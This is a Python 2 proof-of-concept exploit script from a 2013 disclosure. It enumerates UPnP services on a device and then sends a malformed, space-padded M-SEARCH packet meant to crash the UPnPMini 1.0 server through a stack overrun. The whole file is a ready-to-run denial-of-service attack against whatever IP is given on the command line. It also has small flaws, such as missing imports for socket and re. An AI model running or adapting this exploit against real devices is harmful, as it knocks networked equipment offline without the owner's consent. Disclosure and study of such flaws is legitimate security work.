#!/usr/bin/python
#
# Author          : Dejan Lukan (evangeline.eleanor@gmail.com)
# Disclosure Date : 16. March 2013
#

import os
import sys
from SOAPpy import *
from miranda import upnp
from urlparse import urlparse
import urllib2
try:
  from lxml import etree
except ImportError:
  print "You don't have lxml python library installed."
  exit(1)
 


class UPnPService:
  """
  Class that holds the data of a single service offered by UPnP.
  """
  def __init__(self, servicetype, serviceid, controlurl, eventsuburl, scpdurl):
    self.servicetype = servicetype
    self.serviceid   = serviceid
    self.controlurl  = controlurl
    self.eventsuburl = eventsuburl
    self.scpdurp     = scpdurl
    self.actions     = []
  
  def addaction(self, action):
    self.actions.append(action)


  def __repr__(self):
    return 'UPnPService(servicetype=%s, serviceid=%s, controlurl=%s, eventsuburl=%s, scpdurl=%s)' % \
      (self.servicetype, self.serviceid, self.controlurl, self.eventsuburl, self.scpdurp)

  def __str__(self):
    return "UPnPService(%s, %s)" % (self.serviceid, self.scpdurp)
  


class UPnPAction:
  """
  Class that holds the data of a single action of some UPnP service.
  """
  def __init__(self, name):
    self.name = name
    self.args = []

  def addarg(self, arg):
    self.args.append(arg)

  def __repr__(self):
    return 'UPnpAction(name=%s, args=%s)' % (self.name, self.args)

  def __str__(self):
    return '\tUPnpAction(name=%s)' % (self.name)




class UPnPArgument:
  """
  Class that holds the data of a single argument of some UPnP action.
  """
  def __init__(self, name, direction, relatedstate):
    self.name = name
    self.direction = direction
    self.relatedstate = relatedstate

  def __repr__(self):
    return 'UPnPArgument(name=%s, direction=%s, relatedstate=%s)' % (self.name, self.direction, self.relatedstate)

  def __str__(self):
    return '\t\tUPnPArgument(name=%s, direction=%s)' % (self.name, self.direction)





class UPnPDevice:
  """
  The class for each UPnP enabled device on the network. Each device has its own instance of the
  UPnPDevice object.
  """
  def __init__(self, ip, port=1900, timeout=10, debug=1):
    self.ip      = ip
    self.port    = port
    self.timeout = timeout
    self.debug   = debug
    self.xmlurl  = ""
    self.hosturl = ""


  def search(self):
    """
    Send the M-SEARCH query to the IP to find if the UPnP is enabled. The function returns the data
    returned from the device when sending M-SEARCH to it.
    """
    packet = "M-SEARCH * HTTP/1.1\r\n"\
      "HOST: 239.255.255.250:1900\r\n"\
      "ST: ssdp:all\r\n"\
      "MX:2\r\n"\
      "MAN:\"ssdp:discover\"\r\n"

    # send the M-SEARCH packet to the target
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet, (self.ip, self.port))
    sock.settimeout(self.timeout)

    try:
      (data, addr) = sock.recvfrom(4096)
    except socket.timeout:
      print "The device didn't respond to the UPnP M-SEARCH query."
    except Exception:
      print "Unknown error occurred."

    # parse the returned data for URL to the UPnP XML
    for line in data.split('\r\n'):
      headers = line.split(': ')
      if len(headers) != 2:
        continue
      
      if headers[0] == 'Location':
        self.xmlurl = headers[1]
        return headers[1]

    return ""


  def gethosturl(self):
    """
    Get the URL of the XML file from UPnP enabled device.
    """
    if self.hosturl == "":
      xmlurl = self.search()
      self.hosturl = "http://" + urlparse(xmlurl).netloc
    
    return self.hosturl

  
  def getservices(self):
    """
    Gets and parses the XML of the UPnP device and return all the service names.
    """
    # get the url of the XML and fetch the XML
    if self.xmlurl == "":
      self.search()
    xml = urllib2.urlopen(self.xmlurl).read()
   
    # delete the namespace because various problems arise if set, like unable to use xpath() function
    xml = re.sub(r' xmlns="[^"]*"', '', xml)

    # get all the services of the UPnP XML (parse the <service> tags)
    root = etree.XML(xml)
    services = root.xpath("//service")
    servobjs = []

    for service in services:
      servicetype = service.xpath('serviceType/text()')[0]
      serviceid   = service.xpath('serviceId/text()')[0]
      controlurl  = service.xpath('controlURL/text()')[0]
      eventsuburl = service.xpath('eventSubURL/text()')[0]
      scpdurl     = service.xpath('SCPDURL/text()')[0]
      obj         = UPnPService(servicetype, serviceid, controlurl, eventsuburl, scpdurl)
      servobjs.append(obj)

    return servobjs



  def getactions(self, service):
    """
    Gets and parses all the actions of certain service.
    """
    # print service name
    if self.debug:
      print "Service: " + service.serviceid

    # get the XML
    if self.hosturl == "":
      self.gethosturl()
    xml  = urllib2.urlopen(self.hosturl + service.scpdurp).read()
    xml  = re.sub(r' xmlns="[^"]*"', '', xml)
    root = etree.XML(xml)
    actions = root.xpath("//action")

    # get all the actions of certain service (parse the <action> tags)
    for action in actions:
      name = action.xpath("name/text()")[0]
      if self.debug:
        print "\tAction: " + str(name)

      # upnp action object
      actobj = UPnPAction(name)

      # get all the arguments of certain action (parse the <argument> tags)
      args = action.xpath("argumentList/argument")
      for arg in args:
        argname = arg.xpath("name/text()")[0]
        argdirt = arg.xpath("direction/text()")[0]
        argrels = arg.xpath("relatedStateVariable/text()")[0]

        if self.debug:
          print "\t\t" + argname
        
        # upnp argument object
        argobj = UPnPArgument(argname, argdirt, argrels)
        actobj.addarg(argobj)

      service.addaction(actobj)


  def exploit(self):
    """
    Send a malformed request to the UPnPMini 1.0 server.
    """

    if self.hosturl == "":
      self.gethosturl()


    # the M-SEARCH packet that is being read line by line: there shouldn't be CRLF after the
    # ST line
    packet = "M-SEARCH * HTTP/1.1\r\n"\
      "HOST: 239.255.255.250:1900\r\n"\
      "ST:uuid:schemas:device:MX:3"

    # the packet can be at most 1500 bytes long, so add appropriate number of ' ' or '\t'
    # this makes the DoS exploit more probable, since we're occupying the stack with arbitrary
    # characters: there's more chance that the the program will run off the stack.
    packet += ' '*(1500-len(packet))

    
    # send the M-SEARCH packet to the target
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet, (self.ip, self.port))
    sock.settimeout(self.timeout)

    try:
      (data, addr) = sock.recvfrom(4096)
    except socket.timeout:
      print "The device didn't respond to the UPnP M-SEARCH query."
    except Exception:
      print "Unknown error occurred."

    print data





if __name__ == '__main__':
  # Read the IP address as command line parameter.
  if len(sys.argv) != 2:
    print "Usage: " + sys.argv[0] + " <IP>"
    exit(-1)
  ip = sys.argv[1]

  # initialize the new class for exploitation
  upnp = UPnPDevice(ip, debug=1)
  #for service in upnp.getservices():
  #  upnp.getactions(service)
  
  # send the exploit to UPnP
  upnp.exploit()

 
